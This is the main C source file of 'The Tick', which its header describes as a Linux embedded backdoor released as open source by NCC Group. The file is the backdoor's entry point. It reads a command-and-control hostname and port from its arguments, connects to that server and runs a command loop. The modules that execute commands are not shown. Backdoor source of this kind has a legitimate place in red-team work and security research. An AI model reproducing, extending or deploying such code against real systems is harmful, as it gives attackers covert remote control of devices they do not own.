/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <unistd.h>

#include "main.h"
#include "command.h"
#include "http.h"
#include "parser.h"

int main(int argc, char *argv[])
{
    // Call the global initialization routine.
    hello();

    // Set the global cleanup routine to be run automatically on exit.
    atexit(goodbye);

    // Connect to the C&C over TCP.
    if (argc == 3) {
        printf("Starting up...\n");

        // Command line arguments are the hostname and port.
        char *hostname = argv[1];
        int port = atoi(argv[2]);

        // Initialize the parser.
        Parser parser;
        Parser *p = &parser;
        parser_init(p, hostname, port, NULL, NULL);

        // Launch the main command loop.
        while (command_loop(p) == 0) {}
    }

    // Quit.
    return 0;
}

// Global initialization routine.
void hello(void)
{
    // Initialize the HTTP module.
    http_init();
}

// Global cleanup routine.
void goodbye(void)
{
    // Cleanup the HTTP module.
    http_cleanup();
}
